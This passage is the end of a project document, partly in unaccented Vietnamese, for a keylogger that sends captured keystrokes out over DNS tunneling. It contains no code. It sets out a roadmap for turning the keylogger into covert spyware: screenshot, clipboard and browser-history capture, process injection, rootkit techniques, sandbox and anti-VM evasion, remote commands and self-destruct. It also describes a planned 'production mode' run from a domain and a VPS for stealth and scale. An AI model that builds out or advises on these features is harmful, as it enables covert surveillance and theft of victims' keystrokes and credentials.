### 10.1. Protocol Enhancements

1. Reliability:
```
- Acknowledgment system
- Retransmission logic
- Sequence numbers extended
- Checksum validation
```

2. Security:
```
- AES encryption
- Key exchange protocol
- Certificate pinning
- Anti-debugging
```

3. Efficiency:
```
- Compression (gzip)
- Batch multiple keystrokes
- Adaptive buffer size
- Smart retry timing
```

### 10.2. Feature Additions

1. Advanced capture:
```
- Screenshot capture
- Clipboard monitoring
- Browser history
- File upload/download
```

2. Stealth:
```
- Process injection
- Rootkit techniques
- Anti-VM detection
- Sandbox evasion
```

3. Control:
```
- Remote commands
- Config updates
- Self-destruct
- Selective targeting
```

---

## 11. KET LUAN

Project nay la implementation co ban cua DNS Tunneling Keylogger voi 2 che do:

1. LOCAL TEST MODE (hien tai):
   - Don gian, truc tiep
   - Muc dich: Testing va development
   - Khong can infrastructure phuc tap

2. PRODUCTION MODE (tuong lai):
   - Day du, phuc tap
   - Can: Domain, DNS Resolver, VPS
   - Stealth va scale tot hon

Architecture hien tai da duoc toi uu hoa:
- Async sending -> Khong block hook
- Thread-safe queue -> An toan threading
- ASCII filtering -> Tranh decode loi
- Retry logic -> Tang reliability

Code duoc to chuc ro rang voi documentation day du, de dang maintenance va mo rong trong tuong lai.

